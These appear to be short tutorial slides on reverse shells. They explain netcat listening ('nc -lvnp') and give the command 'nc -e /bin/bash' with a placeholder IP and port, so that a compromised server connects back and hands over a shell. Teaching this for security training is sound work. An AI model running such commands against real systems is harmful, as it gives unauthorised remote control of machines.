# Reverse shells

- Typing commands into a webpage is annoying!
- Can we get a shell?
- Normally when you get a shell via SSH, you are the one connecting to a server
- Reverse shells are, as the name implies, the reverse of that process. The server tries to connect to you
- The server has to be able to initiate a connection to you, so you need a public facing server (eduroam blocks this)
- SSH in my server if you need to

##### nc

- Remember nc(netcat)? It can also be used to listen on a port

- nc -lvnp [PORT#]

- - l for listen, v for verbose, n for no DNS, p for port

- Some versions of nc allows you to connect to a port then execute a command

- - nc -e [PROGRAM] [IP] [PORT]
  - Obviously this is a huge security vulnerability
  - Not all nc versions support this

- You can execute “nc -e /bin/bash” on the remote server, “nc -lvnp” on your machine and let it connect to you!
